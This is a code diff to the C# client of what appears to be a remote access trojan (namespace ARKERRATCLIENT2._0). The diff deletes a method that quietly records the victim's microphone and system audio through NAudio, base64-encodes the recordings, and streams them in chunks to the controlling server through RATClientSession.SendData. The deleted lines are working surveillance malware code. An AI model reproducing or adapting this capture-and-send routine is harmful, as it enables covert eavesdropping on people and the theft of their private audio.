@@ -8,8 +8,7 @@ using System.IO;
 using System.Runtime.InteropServices;
 using System.Threading.Tasks;
 using System.Windows.Forms;
-using NAudio.CoreAudioApi;
-using NAudio.Wave;
+
 
 namespace ARKERRATCLIENT2._0
 {
@@ -18,66 +17,8 @@ namespace ARKERRATCLIENT2._0
         public static bool sendingFrames = false;
         private const int ChunkSize = 32768; 
 
-        public static async void StartAudioStreaming()
-        {
-            WaveInEvent microphoneWaveInEvent = new WaveInEvent();
-            microphoneWaveInEvent.WaveFormat = new WaveFormat(41100, 1);
-
-            WasapiLoopbackCapture speakerWaveInEvent = new WasapiLoopbackCapture();
-            speakerWaveInEvent.WaveFormat = microphoneWaveInEvent.WaveFormat;
-
-            microphoneWaveInEvent.DataAvailable += (sender, args) =>
-            {
-                Task.Run(async () =>
-                {
-                    byte[] audioData = new byte[args.BytesRecorded];
-                    Buffer.BlockCopy(args.Buffer, 0, audioData, 0, args.BytesRecorded);
-                    string base64Audio = Convert.ToBase64String(audioData);
-                    const int ChunkSize = 10000; // Adjust the chunk size as needed
-                    for (int i = 0; i < base64Audio.Length; i += ChunkSize)
-                    {
-                        int remainingBytes = Math.Min(ChunkSize, base64Audio.Length - i);
-                        string chunk = base64Audio.Substring(i, remainingBytes);
-                        string audioChunk = "§RemoteDesktopStart§" + "§IA§" + chunk + "§RemoteDesktopEnd§";
-                        RATClientSession.SendData(audioChunk).Wait(); // Use .Wait() to block the async method
-
-                    }
-                });
-
-            };
-
-            speakerWaveInEvent.DataAvailable += (sender, args) =>
-            {
-                Task.Run(async () =>
-                {
-                    byte[] audioData = new byte[args.BytesRecorded];
-                    Buffer.BlockCopy(args.Buffer, 0, audioData, 0, args.BytesRecorded);
-                    string base64Audio = Convert.ToBase64String(audioData);
-                    const int ChunkSize = 10000; // Adjust the chunk size as needed
-                    for (int i = 0; i < base64Audio.Length; i += ChunkSize)
-                    {
-                        int remainingBytes = Math.Min(ChunkSize, base64Audio.Length - i);
-                        string chunk = base64Audio.Substring(i, remainingBytes);
-                        string audioChunk = "§RemoteDesktopStart§" + "§OA§" + chunk + "§RemoteDesktopEnd§";
-                        RATClientSession.SendData(audioChunk).Wait(); // Use .Wait() to block the async method
-                    }
-                });
-            };
-
-            microphoneWaveInEvent.StartRecording();
-            speakerWaveInEvent.StartRecording();
-
-            while (sendingFrames && !RATClientSession.noConnection)
-            {
-                await Task.Delay(10);
-            }
-
-            microphoneWaveInEvent.StopRecording();
-            microphoneWaveInEvent.Dispose();
-
-            speakerWaveInEvent.StopRecording();
-            speakerWaveInEvent.Dispose();
-        }
+        
+           
 
 
 
